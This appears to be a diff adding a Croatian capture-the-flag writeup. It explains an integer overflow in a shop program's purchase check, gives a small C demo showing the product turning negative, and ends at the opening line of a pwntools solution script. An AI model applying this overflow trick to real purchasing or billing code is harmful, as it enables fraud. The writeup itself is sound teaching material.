@@ -1,7 +1,48 @@
+# Writeup
+
+Detaljnom analizom izvornog koda programa, uočena je potencijalna ranjivost programa **integer overflow** kod kupovine stvari. 
+
+Isječak koda koji sadrži ranjivost:
+```
+if(dostupneStvari[opcija-1].cijena * kolicina <= novac){
+		novac-= dostupneStvari[opcija-1].cijena;
+		printf("Kupljeno: %s (%dx)\n", dostupneStvari[opcija-1].ime,kolicina);
+		
+		if(opcija-1 == 4){
+			tajnaStvarKupljena();
+		}
+		
+		return;
+}
+```
+Kako bi izraz ```dostupneStvari[opcija-1].cijena * kolicina <= novac``` bio istinit, može se za količinu stvari _Super tajna stvar_ unijeti jako veliki broj koji će zbog integer overflow-a zadovoljiti izraz.
+
+Izrađen je program koji za količinu uzima broj ```99999999999``` i pomnožimo ga s cijenom stvari _Super tajna stvar_:
+```#include "stdio.h"
+int main()
+{
+    int kolicina = 99999999999;
+    int cijena = 2232350;
+    printf("Kolicina = %d\n", kolicina);
+    printf("cijenaijena = %d\n", cijena);
+    printf("Umnozak = %d\n", kolicina*cijena);
+
+    return 0;
+}
+```
+
+Izlaz programa je:
+```
+Kolicina = 1215752191
+cijenaijena = 2232350
+Umnozak = -1135796254
+```
+
+Izraz ```dostupneStvari[opcija-1].cijena * kolicina <= novac``` postaje ```-1135796254 <= novac```. Pošto je ```novac``` uvijek veći ili jednak nuli, izraz postaje istinit.
 
 
 
-
+Rješenje:
 ```
 from pwn import *
 
